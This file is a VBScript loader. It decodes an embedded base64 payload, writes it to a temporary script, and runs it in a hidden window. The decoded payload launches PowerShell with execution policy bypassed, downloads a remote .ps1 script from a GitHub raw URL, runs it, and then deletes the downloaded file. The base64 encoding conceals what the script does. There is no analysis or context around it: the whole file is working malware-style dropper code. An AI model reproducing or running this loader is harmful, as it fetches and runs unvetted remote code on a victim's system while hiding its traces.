Function Stream_BinaryToString(Binary)
    Dim BinaryStream
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 1 ' adTypeBinary
    BinaryStream.Open
    BinaryStream.Write Binary
    BinaryStream.Position = 0
    BinaryStream.Type = 2 ' adTypeText
    BinaryStream.Charset = "us-ascii"
    Stream_BinaryToString = BinaryStream.ReadText
    BinaryStream.Close
    Set BinaryStream = Nothing
End Function
Function Decoder(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Decoder = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Dim encodedScript
encodedScript = "U2V0IFdzaFNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KV3NoU2hlbGwuUnVuICJwb3dlcnNoZWxsLmV4ZSAtTm9uSSAtTm9QIC1FcCBCeXBhc3MgLVcgSCAtQyBpd3IgLVVyaSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmVpZ2V3b3JtL2Fzc2V0cy9tYWluL1NjcmlwdHMvRm9sZGVySG9zdC5wczEgLU91dEZpbGUgLi90ZW1wLnBzMSIsIDAsIFRydWUNCldzaFNoZWxsLlJ1biAicG93ZXJzaGVsbC5leGUgLU5vbkkgLU5vUCAtRXAgQnlwYXNzIC1XIEggLUZpbGUgIiIuL3RlbXAucHMxIiIiLCAxLCBUcnVlDQpXU2NyaXB0LlNsZWVwIDUwDQpXc2hTaGVsbC5SdW4gInBvd2Vyc2hlbGwuZXhlIC1Ob25JIC1Ob1AgLUVwIEJ5cGFzcyAtVyBIIC1DIFJlbW92ZS1JdGVtIC1QYXRoIC4vdGVtcC5wczEgLUZvcmNlIiwgMCwgVHJ1ZQ=="
Dim decodedScript
decodedScript = Decoder(encodedScript)
Dim tempFile
Dim fs
Set fs = CreateObject("Scripting.FileSystemObject")
tempFile = fs.GetSpecialFolder(2) & "\temp.vbs"
Dim f
Set f = fs.CreateTextFile(tempFile, True)
f.Write decodedScript
f.Close
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run tempFile, 0, True
fs.DeleteFile tempFile, True
Set fs = Nothing